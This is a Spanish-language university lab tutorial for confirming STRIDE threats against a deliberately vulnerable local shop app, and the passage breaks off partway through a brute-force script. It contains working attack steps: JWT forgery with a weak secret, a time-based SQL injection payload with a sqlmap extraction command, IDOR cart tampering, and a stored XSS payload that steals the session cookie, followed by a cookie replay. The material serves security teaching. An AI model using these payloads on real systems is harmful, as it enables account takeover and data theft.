# Tutorial 02 — Validación del Registro STRIDE contra la Aplicación

> **Persona B** — Ejecutar paso a paso para demostrar que cada amenaza del registro STRIDE es real en la aplicación corriendo.

---

## ¿Qué es la validación STRIDE y por qué hacerla?

El registro STRIDE (`threat-model/stride.md`) contiene 10 amenazas teóricas organizadas por categoría: **S**poofing, **T**ampering, **R**epudiation, **I**nformation Disclosure, **D**enial of Service y **E**levation of Privilege. Cada fila dice "esta amenaza *podría* existir".

**Validar** el registro STRIDE significa **provocar cada amenaza en la aplicación real** y demostrar con evidencia observable (respuestas HTTP, tiempos, datos devueltos) que la amenaza **sí se materializa**. Sin esta validación, el registro es solo teoría — el entregable exige que cada amenaza tenga evidencia de que es real.

Al terminar este tutorial tendrás:
- 10 amenazas confirmadas con capturas de pantalla
- Evidencia en Burp Suite para cada una
- Una tabla resumen de resultados PASS/FAIL
- Material listo para el informe y el video

---

## Requisitos previos

### 1. Configurar `LAB_MODE=redteam`

Antes de levantar la aplicación, asegúrate de que existe el archivo `.env` con el modo Red Team activo. Sin él, las vulnerabilidades intencionales del laboratorio quedan deshabilitadas.

**Si es una PC nueva (no existe `.env`):**

```bash
cd ~/seguridad/unapec-isw-mini-shop-security-lab
cp .env.example .env
```

**Si ya existe `.env` pero no tiene `LAB_MODE`**, edítalo con nano:

```bash
nano .env
```

Dentro de nano, asegúrate de que contenga esta línea (agrégala si falta):

```
LAB_MODE=redteam
```

Para guardar y salir: `Ctrl+O` → `Enter` → `Ctrl+X`.

**Si el compose ya estaba corriendo sin `LAB_MODE`**, después de crear/editar el `.env` recrea el contenedor:

```bash
docker compose up -d shop --force-recreate
```

Verifica que el modo quedó activo:

```bash
docker compose exec shop printenv LAB_MODE
```

Debe devolver `redteam`.

### 2. Aplicación corriendo

```bash
cd ~/seguridad/unapec-isw-mini-shop-security-lab
docker compose up --build -d
docker compose ps
```

Verifica que la columna PORTS muestre `127.0.0.1:5081->8080/tcp`. Si ves otro puerto, revisa `compose.override.yaml`.

> **Nota sobre el puerto:** La documentación original usa 5080, pero tenemos `compose.override.yaml` que redirige a **5081**. Todos los comandos de este tutorial usan **5081**.

Prueba rápida:

```bash
curl -s http://127.0.0.1:5081/api/health
```

Debe responder `Healthy`.

### 3. Cuentas seed

| Cuenta | Contraseña | Rol | ID usuario | ID carrito | ID pedido |
|---|---|---|---|---|---|
| `cliente-a` | `LabClienteA2026!` | Cliente | 1 | 1 | 1 |
| `cliente-b` | `LabClienteB2026!` | Cliente | 2 | 2 | 2 |
| `cliente-xss` | `LabXss2026!` | Cliente | 3 | — | — |
| `cliente-brute` | `LabPass2026!` | Cliente | 4 | — | — |
| `vendedor-lab` | `LabSeller2026!` | Vendedor | 5 | — | — |
| `admin-lab` | `LabAdmin2026!` | Admin | 6 | — | — |

### 4. Instalar y configurar Burp Suite

#### Abrir Burp Suite

```bash
/home/ray/BurpSuite/BurpSuite &
```

#### Configuración inicial paso a paso

1. **Seleccionar proyecto temporal:**
   - Al abrir Burp, aparece la ventana "Project Options"
   - Selecciona **"Temporary project"** → clic en **Next**
   - Selecciona **"Use Burp defaults"** → clic en **Start Burp**

2. **Verificar el proxy:**
   - Ve a la pestaña **Proxy** → sub-pestaña **Options** (o **Proxy settings**)
   - Confirma que hay un listener activo en `127.0.0.1:8080`
   - Si no hay listener: clic en **Add** → Bind to port: `8080` → Bind to address: `Loopback only` → **OK**

3. **Configurar el scope (MUY IMPORTANTE):**
   - Ve a **Target** → sub-pestaña **Scope**
   - Clic en **Add** bajo "Include in scope"
   - En el campo **Prefix**, escribe: `http://127.0.0.1:5081`
   - Clic **OK**
   - Cuando pregunte si quieres dejar de registrar tráfico fuera de scope, responde **Yes**

4. **Abrir el navegador integrado de Burp:**
   - Ve a **Proxy** → sub-pestaña **Intercept**
   - Asegúrate de que **Intercept is off** (debe decir "off", no "on")
   - Clic en **Open browser** (botón arriba a la derecha)
   - Se abre un navegador Chromium que ya está configurado para usar el proxy de Burp
   - Navega a `http://127.0.0.1:5081` — deberías ver la tienda

5. **Verificar que Burp captura tráfico:**
   - En Burp, ve a **Proxy** → sub-pestaña **HTTP history**
   - Deberías ver las peticiones que hiciste al navegar
   - Si no ves nada, revisa que el Intercept esté en **off** y el listener esté activo

### 5. Herramientas adicionales

Crea los entornos virtuales para los scripts de Python:

```bash
cd ~/seguridad/unapec-isw-mini-shop-security-lab

# Entorno para fuerza bruta (requests)
python3 -m venv .venv-auth
./.venv-auth/bin/pip install requests

# Entorno para JWT (PyJWT)
python3 -m venv .venv-jwt
./.venv-jwt/bin/pip install 'PyJWT>=2,<3'
```

Instala sqlmap si no lo tienes:

```bash
# Si usas Debian/Ubuntu:
sudo apt install sqlmap
# Verificar:
sqlmap --version
```

---

## Amenaza S-01 — Spoofing: Enumeración de usuarios en login

### Claim del registro STRIDE

> *"Login distingue usuarios — enumerar usuario válido y probar credenciales ficticias hasta acceder como ese usuario."*

### Contexto

- **Endpoint:** `POST /api/auth/login`
- **Mecanismo:** La app devuelve mensajes de error DISTINTOS para "usuario no existe" vs "contraseña incorrecta", lo que permite a un atacante saber qué cuentas existen.
- **Cuentas:** Se compara una cuenta inexistente vs `cliente-brute` (que sí existe).

### Paso 1: Probar con usuario inexistente (terminal)

```bash
curl -s -w "\nHTTP_CODE: %{http_code}\nTIME: %{time_total}s\nSIZE: %{size_download} bytes\n" \
  -X POST http://127.0.0.1:5081/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"no-existe-lab","password":"Incorrecta!"}'
```

Anota:
- El código HTTP (esperado: 401)
- El mensaje del cuerpo de la respuesta
- El tamaño en bytes
- El tiempo de respuesta

### Paso 2: Probar con usuario existente pero contraseña incorrecta

```bash
curl -s -w "\nHTTP_CODE: %{http_code}\nTIME: %{time_total}s\nSIZE: %{size_download} bytes\n" \
  -X POST http://127.0.0.1:5081/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"cliente-brute","password":"Incorrecta!"}'
```

Anota los mismos datos. **Compara**: si el mensaje, tamaño o código difiere entre las dos respuestas, la enumeración es posible.

### Paso 3: Repetir en Burp Repeater

1. En el **navegador de Burp**, navega a `http://127.0.0.1:5081`
2. En Burp, ve a **Proxy** → **HTTP history**
3. Busca cualquier petición al host `127.0.0.1:5081`
4. Haz **clic derecho** sobre ella → **Send to Repeater**
5. En la pestaña **Repeater** (arriba), modifica la petición manualmente:
   - Cambia la primera línea a: `POST /api/auth/login HTTP/1.1`
   - Asegúrate de que la cabecera `Host:` diga `127.0.0.1:5081`
   - Añade/verifica la cabecera: `Content-Type: application/json`
   - En el cuerpo, pon: `{"username":"no-existe-lab","password":"Incorrecta!"}`
6. Clic en **Send**
7. En el panel derecho (Response), anota el código y el cuerpo
8. Ahora cambia el cuerpo a: `{"username":"cliente-brute","password":"Incorrecta!"}`
9. Clic en **Send** de nuevo
10. **Compara** ambas respuestas lado a lado

### Resultado esperado

La respuesta para un usuario que **no existe** tiene un mensaje distinto (por ejemplo, "User not found" o un status/body diferente) que la respuesta para un usuario que **sí existe** pero la contraseña es incorrecta (por ejemplo, "Invalid password"). Esta diferencia permite a un atacante enumerar qué cuentas existen en el sistema.

### Criterio PASS/FAIL

| Resultado | Criterio |
|---|---|
| **PASS** (amenaza confirmada) | Las respuestas para usuario inexistente vs existente difieren en mensaje, código HTTP, tamaño o tiempo |
| **FAIL** (amenaza no confirmada) | Las respuestas son idénticas en todos los aspectos |

### Evidencia a capturar (screenshot)

1. Burp Repeater mostrando la petición con usuario inexistente y su respuesta
2. Burp Repeater mostrando la petición con usuario existente y su respuesta
3. Ambas respuestas visibles para comparar la diferencia

---

## Amenaza S-02 — Spoofing: JWT con secreto débil permite suplantar Admin

### Claim del registro STRIDE

> *"Token débil o algoritmo no seguro permite que Cliente se haga pasar por Admin."*

### Contexto

- **Mecanismo:** El JWT se firma con HS256 usando el secreto `MiniShopLab2026` (débil y adivinable). Un atacante puede decodificar el token, cambiar el rol a "Admin" y firmar un nuevo token con el mismo secreto.
- **Endpoint afectado:** `GET /api/admin` — protegido por rol Admin en JWT.
- **Cuenta:** `cliente-a` obtiene un JWT con rol "Cliente", lo forjamos a "Admin".

### Paso 1: Obtener el JWT de cliente-a

```bash
curl -s -X POST http://127.0.0.1:5081/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"cliente-a","password":"LabClienteA2026!"}' | python3 -m json.tool
```

Copia el valor del campo `token` de la respuesta. Guárdalo en una variable temporal:

```bash
JWT_CLIENTE=$(curl -s -X POST http://127.0.0.1:5081/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"cliente-a","password":"LabClienteA2026!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

echo "$JWT_CLIENTE"
```

### Paso 2: Verificar que el JWT de Cliente NO puede acceder a /api/admin

```bash
curl -s -w "\nHTTP_CODE: %{http_code}\n" \
  http://127.0.0.1:5081/api/admin \
  -H "Authorization: Bearer $JWT_CLIENTE"
```

**Resultado esperado:** HTTP 403 (Forbidden). El JWT es válido pero el rol "Cliente" no tiene permiso.

### Paso 3: Decodificar el JWT localmente

```bash
echo "$JWT_CLIENTE" | cut -d. -f2 | base64 -d 2>/dev/null; echo
```

Verás algo como: `{"sub":"1","unique_name":"cliente-a","role":"Cliente","iss":"MiniShopLab","aud":"MiniShopLab","exp":...}`

### Paso 4: Forjar el token con PyJWT

Crea el script de forja:

```bash
cat > /tmp/forge_lab_token.py << 'PYEOF'
from getpass import getpass
import jwt

original = getpass("JWT de cliente emitido por el laboratorio: ")
secret = getpass("Secreto HS256 de laboratorio (MiniShopLab2026): ")
claims = jwt.decode(original, options={"verify_signature": False, "verify_exp": False})
print("Claims originales:", claims)
claims["role"] = "Admin"
forged = jwt.encode(claims, secret, algorithm="HS256")
print("Token forjado:", forged)
PYEOF
```

Ejecútalo (te pedirá pegar el JWT y el secreto — no se muestran en pantalla):

```bash
./.venv-jwt/bin/python /tmp/forge_lab_token.py
```

Cuando te pida:
- **JWT de cliente:** pega el valor de `$JWT_CLIENTE`
- **Secreto:** escribe `MiniShopLab2026`

Copia el **"Token forjado"** que imprime. Guárdalo:

```bash
JWT_FORJADO="<pega-aqui-el-token-forjado>"
```

### Paso 5: Usar el token forjado contra /api/admin

```bash
curl -s -w "\nHTTP_CODE: %{http_code}\n" \
  http://127.0.0.1:5081/api/admin \
  -H "Authorization: Bearer $JWT_FORJADO"
```

**Resultado esperado:** HTTP 200 con datos administrativos. El servidor acepta el token forjado porque el secreto es correcto y el rol ahora es "Admin".

### Paso 6: Repetir en Burp Repeater

1. En Burp **Proxy** → **HTTP history**, busca la petición `POST /api/auth/login` (la que hiciste en Paso 1)
2. Si no la ves en el historial, haz la petición desde el navegador de Burp o repítela desde Repeater
3. Haz **clic derecho** → **Send to Repeater** sobre cualquier petición
4. En Repeater, construye la petición:
   ```
   GET /api/admin HTTP/1.1
   Host: 127.0.0.1:5081
   Authorization: Bearer <TOKEN_ORIGINAL_DE_CLIENTE>
   ```
5. Clic **Send** — verás la respuesta 403
6. Ahora reemplaza el token por el forjado:
   ```
   GET /api/admin HTTP/1.1
   Host: 127.0.0.1:5081
   Authorization: Bearer <TOKEN_FORJADO>
   ```
7. Clic **Send** — verás la respuesta 200 con datos de admin

### Criterio PASS/FAIL

| Resultado | Criterio |
|---|---|
| **PASS** (amenaza confirmada) | El token forjado con rol "Admin" obtiene HTTP 200 en `/api/admin` |
| **FAIL** (amenaza no confirmada) | El token forjado es rechazado (401 o 403) |

### Evidencia a capturar (screenshot)

1. Salida del script mostrando los claims originales (rol "Cliente") y el token forjado
2. Burp Repeater: petición con JWT original de Cliente → respuesta 403
3. Burp Repeater: petición con JWT forjado (Admin) → respuesta 200

---

## Amenaza T-01 — Tampering: SQLi blind time-based en búsqueda

### Claim del registro STRIDE

> *"SQLi blind permite alterar condición de consulta e inferir nombre de BD/tablas sintéticas."*

### Contexto

- **Endpoint:** `GET /api/products/search?q=`
- **Mecanismo:** El parámetro `q` se concatena directamente en una consulta SQL. Un atacante puede inyectar `pg_sleep()` para causar retrasos y confirmar la inyección.
- **No requiere autenticación** — es un endpoint público de catálogo.

### Paso 1: Medir la respuesta normal (baseline)

```bash
time curl -s -o /dev/null -w "HTTP_CODE: %{http_code} SIZE: %{size_download} TIME: %{time_total}s\n" \
  "http://127.0.0.1:5081/api/products/search?q=demo"
```

Ejecuta esto 3 veces y anota los tiempos. El tiempo normal debería ser < 0.5 segundos.

### Paso 2: Inyectar pg_sleep para confirmar SQLi

```bash
time curl -s -o /dev/null -w "HTTP_CODE: %{http_code} SIZE: %{size_download} TIME: %{time_total}s\n" \
  "http://127.0.0.1:5081/api/products/search?q=demo'+AND+1=1+AND+pg_sleep(3)+IS+NOT+NULL--"
```

**Resultado esperado:** El tiempo de respuesta será ~3 segundos (vs < 0.5s del baseline). Esto confirma que la inyección SQL funciona.

Repite 3 veces para confirmar que el retraso es **consistente y repetible**.

### Paso 3: Repetir en Burp Repeater

1. En el **navegador de Burp**, visita: `http://127.0.0.1:5081/api/products/search?q=demo`
2. En Burp **Proxy** → **HTTP history**, busca la petición `GET /api/products/search?q=demo`
3. **Clic derecho** → **Send to Repeater**
4. En Repeater, verás la petición:
   ```
   GET /api/products/search?q=demo HTTP/1.1
   Host: 127.0.0.1:5081
   ```
5. Clic **Send** — anota el tiempo que aparece abajo a la derecha (ej: "145 millis")
6. Ahora modifica el parámetro `q` en la URL de la petición:
   ```
   GET /api/products/search?q=demo'+AND+1=1+AND+pg_sleep(3)+IS+NOT+NULL-- HTTP/1.1
   Host: 127.0.0.1:5081
   ```
7. Clic **Send** — el tiempo ahora será ~3000 millis
8. Observa abajo a la derecha donde Burp muestra el tiempo de respuesta

### Paso 4: Confirmar con sqlmap (extracción de metadatos)

```bash
sqlmap -u "http://127.0.0.1:5081/api/products/search?q=demo" \
  -p q --dbms=PostgreSQL --technique=T --time-sec=2 \
  --current-db --tables --batch --threads=1 \
  --timeout=10 --retries=1 \
  --output-dir=/tmp/sqlmap-stride-t01
```

**Resultado esperado:** sqlmap detecta la inyección y muestra:
- El nombre de la base de datos actual (ej: `minishop`)
- Los nombres de las tablas (ej: `Products`, `Comments`, `Users`, `Carts`, `CartItems`, `Orders`, `__EFMigrationsHistory`)

### Criterio PASS/FAIL

| Resultado | Criterio |
|---|---|
| **PASS** (amenaza confirmada) | La inyección con `pg_sleep` causa un retraso repetible Y sqlmap extrae nombre de BD y tablas |
| **FAIL** (amenaza no confirmada) | No hay diferencia de tiempo o sqlmap no detecta la inyección |

### Evidencia a capturar (screenshot)

1. Burp Repeater: petición normal con tiempo < 500ms
2. Burp Repeater: petición con `pg_sleep(3)` mostrando tiempo ~3000ms
3. Salida de sqlmap mostrando el nombre de la BD y las tablas detectadas

---

## Amenaza T-02 — Tampering: Cliente A modifica carrito/pedido de Cliente B

### Claim del registro STRIDE

> *"Modificar cantidad de un recurso propiedad de Cliente B."*

### Contexto

- **Endpoints:** `PUT /api/cart/{cartId}/items/{itemId}`, `PUT /api/orders/{orderId}`
- **Mecanismo:** La app confía en el ID que envía el cliente sin verificar que el recurso pertenece al usuario autenticado.
- **Cuentas:** Cliente A (ID carrito=1) modifica un item del carrito de Cliente B (ID carrito=2, ID item=2).

### Paso 1: Autenticarse como Cliente A y obtener su JWT

```bash
JWT_A=$(curl -s -X POST http://127.0.0.1:5081/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"cliente-a","password":"LabClienteA2026!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

### Paso 2: Ver el carrito propio de A (referencia)

```bash
curl -s http://127.0.0.1:5081/api/cart/1 \
  -H "Authorization: Bearer $JWT_A" | python3 -m json.tool
```

Esto es normal — Cliente A accede a su propio carrito (ID 1).

### Paso 3: Leer el carrito de Cliente B (IDOR lectura)

```bash
curl -s -w "\nHTTP_CODE: %{http_code}\n" \
  http://127.0.0.1:5081/api/cart/2 \
  -H "Authorization: Bearer $JWT_A" | python3 -m json.tool
```

**Resultado esperado:** HTTP 200 con los datos del carrito de B. Esto NO debería ser posible — A no es dueño del carrito 2.

### Paso 4: Modificar la cantidad de un item de B

Primero, verifica el estado actual del item 2 del carrito 2:

```bash
curl -s http://127.0.0.1:5081/api/cart/2 \
  -H "Authorization: Bearer $JWT_A" | python3 -m json.tool
```

Anota la cantidad actual del item. Ahora modifícala:

```bash
curl -s -w "\nHTTP_CODE: %{http_code}\n" \
  -X PUT http://127.0.0.1:5081/api/cart/2/items/2 \
  -H "Authorization: Bearer $JWT_A" \
  -H "Content-Type: application/json" \
  -d '{"quantity": 99}'
```

Verifica que la cantidad cambió:

```bash
curl -s http://127.0.0.1:5081/api/cart/2 \
  -H "Authorization: Bearer $JWT_A" | python3 -m json.tool
```

**Resultado esperado:** La cantidad del item cambió a 99. Cliente A pudo modificar datos que pertenecen a Cliente B.

### Paso 5: Repetir en Burp Repeater

1. En Burp **Proxy** → **HTTP history**, busca la petición `GET /api/cart/2` que acabas de hacer
2. **Clic derecho** → **Send to Repeater**
3. En Repeater, cámbiala a la petición de modificación:
   ```
   PUT /api/cart/2/items/2 HTTP/1.1
   Host: 127.0.0.1:5081
   Authorization: Bearer <JWT_DE_CLIENTE_A>
   Content-Type: application/json

   {"quantity": 2}
   ```
4. Clic **Send** — verás la respuesta 200 confirmando la modificación

### Paso 6: Restaurar el seed

```bash
docker compose down && docker compose up --build -d
```

### Criterio PASS/FAIL

| Resultado | Criterio |
|---|---|
| **PASS** (amenaza confirmada) | Cliente A puede leer Y modificar el carrito/pedido de Cliente B |
| **FAIL** (amenaza no confirmada) | La app rechaza el acceso al recurso ajeno (403) |

### Evidencia a capturar (screenshot)

1. Burp Repeater: `GET /api/cart/1` con JWT de A → respuesta con datos de A
2. Burp Repeater: `GET /api/cart/2` con JWT de A → respuesta con datos de B (no debería ser posible)
3. Burp Repeater: `PUT /api/cart/2/items/2` con JWT de A → respuesta confirmando la modificación

---

## Amenaza R-01 — Repudiation: No hay tabla de auditoría

### Claim del registro STRIDE

> *"Sin eventos atribuibles no se puede reconstruir quién cambió recurso y cuándo."*

### Contexto

- **Mecanismo:** La aplicación no tiene una tabla de auditoría que registre quién hizo qué y cuándo. Esto significa que si alguien modifica un producto, carrito o pedido, no hay forma de rastrear quién fue.
- **Verificación:** Revisamos la base de datos para confirmar que no existe ninguna tabla de log/auditoría.

### Paso 1: Listar las tablas de la base de datos

```bash
docker compose exec db psql -U minishop -d minishop -c "\dt"
```

**Resultado esperado:** Verás tablas como `Products`, `Comments`, `Users`, `Carts`, `CartItems`, `Orders` y `__EFMigrationsHistory`. No existe ninguna tabla llamada `AuditLog`, `EventLog`, `ActivityLog` ni similar.

### Paso 2: Buscar columnas de auditoría en las tablas

```bash
docker compose exec db psql -U minishop -d minishop -c "
  SELECT table_name, column_name
  FROM information_schema.columns
  WHERE table_schema = 'public'
    AND (column_name ILIKE '%audit%'
      OR column_name ILIKE '%modified_by%'
      OR column_name ILIKE '%changed_by%'
      OR column_name ILIKE '%actor%'
      OR column_name ILIKE '%request_id%')
  ORDER BY table_name;
"
```

**Resultado esperado:** Cero filas. No hay campos de trazabilidad en ninguna tabla.

### Paso 3: Hacer una acción y verificar que no se registra

Haz una modificación como vendedor y verifica que no hay log:

```bash
# Autenticarse como vendedor
JWT_V=$(curl -s -X POST http://127.0.0.1:5081/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"vendedor-lab","password":"LabSeller2026!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Modificar un producto (cambiar precio por ejemplo)
curl -s -X PUT http://127.0.0.1:5081/api/products/1 \
  -H "Authorization: Bearer $JWT_V" \
  -H "Content-Type: application/json" \
  -d '{"name":"Producto Lab Modificado","price":999.99}' -w "\nHTTP: %{http_code}\n"

# Buscar si se registró algo en alguna tabla de log
docker compose exec db psql -U minishop -d minishop -c "
  SELECT table_name FROM information_schema.tables
  WHERE table_schema = 'public'
  ORDER BY table_name;
"
```

### Paso 4: Repetir en Burp Repeater

1. En Burp Repeater, envía la misma petición `PUT /api/products/1` con los datos del vendedor
2. Observa que la respuesta no incluye ningún campo de auditoría (no hay `modifiedBy`, `modifiedAt`, `requestId`)
3. La respuesta solo tiene los datos del producto modificado

### Criterio PASS/FAIL

| Resultado | Criterio |
|---|---|
| **PASS** (amenaza confirmada) | No existe tabla de auditoría ni columnas de trazabilidad en ninguna tabla |
| **FAIL** (amenaza no confirmada) | Existe tabla de auditoría con actor, acción, timestamp y request ID |

### Evidencia a capturar (screenshot)

1. Terminal: salida de `\dt` mostrando que no hay tabla de auditoría
2. Terminal: consulta de columnas que devuelve cero filas
3. Burp Repeater: una acción de escritura que no genera registro de auditoría

---

## Amenaza I-01 — Information Disclosure: XSS almacenado roba cookie de sesión

### Claim del registro STRIDE

> *"XSS persistente captura la cookie válida de un usuario ficticio y la envía a /lab/collect."*

### Contexto

- **Mecanismo:** Un atacante guarda un comentario con código JavaScript malicioso. Cuando otro usuario ve el comentario, el script se ejecuta en su navegador, lee la cookie `LabSession` (que no tiene `HttpOnly`) y la envía al endpoint `/lab/collect`.
- **Endpoint de comentarios:** `POST /api/products/{id}/comments`
- **Endpoint de captura:** `GET /lab/collect?c=<cookie>`
- **Cuentas:** Atacante = `cliente-a`, Víctima = `cliente-xss`

### Paso 1: Autenticarse como atacante (cliente-a) y obtener cookie MVC

En el **navegador de Burp**:
1. Navega a `http://127.0.0.1:5081/Account/Login`
2. Ingresa: usuario `cliente-a`, contraseña `LabClienteA2026!`
3. Clic en "Iniciar sesión"

Verifica en Burp **HTTP history** que hay un `POST /Account/Login` con respuesta `302` y la cabecera `Set-Cookie: LabSession=...`

### Paso 2: Publicar el comentario malicioso

En la terminal (con curl):

```bash
# Obtener la cookie de cliente-a por MVC
COOKIE_A=$(curl -s -c - -X POST http://127.0.0.1:5081/Account/Login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "Username=cliente-a&Password=LabClienteA2026!" \
  -L | grep -oP 'LabSession=\S+' || true)

# Si el método anterior no funciona, usa el login API y cookie manual.
# Alternativa: publica el comentario directamente
curl -s -X POST "http://127.0.0.1:5081/api/products/1/comments" \
  -H "Content-Type: application/json" \
  -d '{"body":"<img src=x onerror=\"fetch('"'"'/lab/collect?c='"'"'+encodeURIComponent(document.cookie))\">"}'
```

Forma alternativa más limpia (sin problemas de escape):

```bash
JWT_A=$(curl -s -X POST http://127.0.0.1:5081/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"cliente-a","password":"LabClienteA2026!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

curl -s -X POST "http://127.0.0.1:5081/api/products/1/comments" \
  -H "Authorization: Bearer $JWT_A" \
  -H "Content-Type: application/json" \
  -d '{"body":"<img src=x onerror=\"fetch('"'"'/lab/collect?c='"'"'+encodeURIComponent(document.cookie))\">"}'
```

**Resultado esperado:** HTTP 201 o 200 — el comentario se guardó.

### Paso 3: Verificar que el comentario está almacenado

```bash
curl -s "http://127.0.0.1:5081/api/products/1/comments" | python3 -m json.tool
```

Deberías ver el tag `<img src=x onerror=...>` en el cuerpo del comentario (almacenado sin sanitización).

### Paso 4: Iniciar sesión como víctima (cliente-xss) y activar el XSS

1. En el **navegador de Burp**, cierra sesión actual (navega a `/Account/Logout` o borra cookies)
2. Navega a `http://127.0.0.1:5081/Account/Login`
3. Ingresa: usuario `cliente-xss`, contraseña `LabXss2026!`
4. Navega a `http://127.0.0.1:5081/Products/Details/1` — la página del producto con el comentario malicioso

### Paso 5: Verificar la captura de cookie en Burp

1. En Burp **Proxy** → **HTTP history**, busca una petición a `GET /lab/collect?c=...`
2. **Haz clic en esa petición** — en la parte de la URL verás el parámetro `c` que contiene la cookie `LabSession` del usuario `cliente-xss`
3. La respuesta será un `204 No Content`

Copia el valor de la cookie `LabSession` del parámetro `c` (decodifica el URL encoding si es necesario).

### Paso 6: Replay de la cookie robada

1. En Burp **HTTP history**, selecciona cualquier petición GET
2. **Clic derecho** → **Send to Repeater**
3. En Repeater, construye esta petición:
   ```
   GET /Account/Profile HTTP/1.1
   Host: 127.0.0.1:5081
   Cookie: LabSession=<COOKIE_ROBADA_DE_CLIENTE_XSS>
   ```
   Reemplaza `<COOKIE_ROBADA_DE_CLIENTE_XSS>` con el valor que copiaste del paso anterior.
4. Clic **Send**

**Resultado esperado:** La respuesta muestra la página de perfil de `cliente-xss`, demostrando que la cookie robada permite suplantar la sesión de la víctima.

### Criterio PASS/FAIL

| Resultado | Criterio |
|---|---|
| **PASS** (amenaza confirmada) | El XSS se ejecuta, la cookie se envía a `/lab/collect`, y el replay muestra la identidad de `cliente-xss` |
| **FAIL** (amenaza no confirmada) | El XSS no se ejecuta (contenido escapado) o la cookie tiene `HttpOnly` |

### Evidencia a capturar (screenshot)

1. Burp HTTP history: la petición POST que guardó el comentario malicioso
2. Navegador de Burp: la página del producto mostrando que el script se ejecutó (puede que veas un icono roto de imagen)
3. Burp HTTP history: la petición `GET /lab/collect?c=LabSession%3D...` con respuesta 204
4. Burp Repeater: la petición `GET /Account/Profile` con la cookie robada → respuesta con identidad de `cliente-xss`

---

## Amenaza I-02 — Information Disclosure: BOLA revela datos de otro cliente

### Claim del registro STRIDE

> *"BOLA revela contenido sintético de otro cliente."*

### Contexto

- **Endpoints:** `GET /api/cart/{cartId}`, `GET /api/orders/{orderId}`
- **Mecanismo:** Es el mismo IDOR que T-02, pero clasificado como **divulgación de información** (lectura) en lugar de tampering (modificación). Aquí enfocamos solo la lectura de datos ajenos.
- **Cuentas:** Cliente A lee los datos de Cliente B.

### Paso 1: Autenticarse como Cliente A

```bash
JWT_A=$(curl -s -X POST http://127.0.0.1:5081/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"cliente-a","password":"LabClienteA2026!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

### Paso 2: Leer el carrito de Cliente B

```bash
curl -s http://127.0.0.1:5081/api/cart/2 \
  -H "Authorization: Bearer $JWT_A" | python3 -m json.tool
```

**Resultado esperado:** HTTP 200 con datos del carrito de B (productos, cantidades, precios). A no debería poder ver esto.

### Paso 3: Leer el pedido de Cliente B

```bash
curl -s http://127.0.0.1:5081/api/orders/2 \
  -H "Authorization: Bearer $JWT_A" | python3 -m json.tool
```

**Resultado esperado:** HTTP 200 con datos del pedido de B.

### Paso 4: En Burp Repeater

1. Envía `GET /api/cart/1` con JWT de A → respuesta con carrito de A (normal)
2. Cambia a `GET /api/cart/2` con el mismo JWT de A → respuesta con carrito de B (BOLA)
3. Haz screenshot de ambas respuestas

### Criterio PASS/FAIL

| Resultado | Criterio |
|---|---|
| **PASS** (amenaza confirmada) | Cliente A puede leer carrito y/o pedido de Cliente B |
| **FAIL** (amenaza no confirmada) | La app rechaza el acceso (403 o datos vacíos) |

### Evidencia a capturar (screenshot)

1. Burp Repeater: `GET /api/cart/2` con JWT de A → datos del carrito de B visibles
2. Burp Repeater: `GET /api/orders/2` con JWT de A → datos del pedido de B visibles

---

## Amenaza I-03 — Information Disclosure: Enumeración de usuarios en login

### Claim del registro STRIDE

> *"Mensaje/status/tamaño/tiempo permite inferir qué cuentas existen."*

### Contexto

Esta es la misma vulnerabilidad que S-01, pero clasificada como **divulgación de información** en lugar de spoofing. En S-01, el enfoque es que un atacante puede suplantar una identidad. Aquí, el enfoque es que la app **revela información** sobre qué cuentas existen.

### Paso 1: Repetir las mismas peticiones de S-01

```bash
# Usuario inexistente
curl -s -w "\nHTTP: %{http_code} SIZE: %{size_download}\n" \
  -X POST http://127.0.0.1:5081/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"no-existe-lab","password":"Test123!"}'

# Usuario existente, contraseña incorrecta
curl -s -w "\nHTTP: %{http_code} SIZE: %{size_download}\n" \
  -X POST http://127.0.0.1:5081/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"cliente-brute","password":"Test123!"}'
```

### Paso 2: Documentar la diferencia como divulgación

Anota la diferencia en la respuesta. En el informe, esta amenaza se reporta desde la perspectiva de **confidencialidad**: la app revela si una cuenta existe o no, lo cual es información que un atacante puede usar para:
- Crear una lista de cuentas válidas
- Dirigir ataques de fuerza bruta solo a cuentas que sí existen
- Correlacionar cuentas con otros servicios

### Paso 3: En Burp Repeater

Repite las mismas peticiones de S-01 en Repeater y toma screenshots enfocados en la **diferencia de las respuestas** (texto del mensaje, tamaño, código HTTP).

### Criterio PASS/FAIL

| Resultado | Criterio |
|---|---|
| **PASS** (amenaza confirmada) | Las respuestas son distinguibles (diferente mensaje, tamaño o código) |
| **FAIL** (amenaza no confirmada) | Las respuestas son idénticas |

### Evidencia a capturar (screenshot)

1. Burp Repeater: dos respuestas lado a lado mostrando la diferencia
2. Tabla comparativa en el informe: usuario inexistente vs existente → qué información se revela

---

## Amenaza D-01 — Denial of Service: Sin rate limit en login (Red Team)

### Claim del registro STRIDE

> *"Ausencia de límite permite volumen de intentos y consumo desproporcionado."*

### Contexto

- **Endpoint:** `POST /api/auth/login`
- **Mecanismo:** En modo Red Team (`LAB_MODE=redteam`), el rate limiter está deshabilitado. Un atacante puede enviar peticiones de login ilimitadas sin ser bloqueado.
- **Límite de demostración:** Solo enviamos 5 peticiones secuenciales (no es un ataque real, solo demostración de la ausencia de control).

### Paso 1: Ejecutar el script de fuerza bruta limitada

Crea el script:

```bash
cat > /tmp/auth_bruteforce.py << 'PYEOF'
from urllib.parse import urlparse
import requests

target = "http://127.0.0.1:5081/api/auth/login"
if urlparse(target).hostname != "127.0.0.1":
    raise SystemExit("Cancelado: el target no es loopback")

passwords = ["incorrecta1", "incorrecta2", "Admin2026!", "Cliente2026!", "LabPass2026!"]
